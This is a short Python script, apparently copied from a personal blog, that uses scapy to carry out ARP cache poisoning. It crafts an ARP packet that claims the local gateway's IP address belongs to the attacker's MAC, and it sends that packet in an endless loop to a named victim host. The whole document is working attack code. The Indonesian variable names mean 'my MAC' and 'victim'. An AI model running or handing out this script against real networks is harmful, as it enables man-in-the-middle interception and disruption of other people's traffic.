#!/usr/bin/python
 
# Python arp poison example script
# Written by aviran
# visit for more details aviran.org
 
from scapy.all import *
mac_aku = "20:16:D8:29:E9:9C"
ip_gateway = "192.168.100.1"
ip_korban = "192.168.100.10"

packet = Ether()/ARP(op="who-has",hwsrc=mac_aku,psrc=ip_gateway,pdst=ip_korban)

while 1: 
    sendp(packet)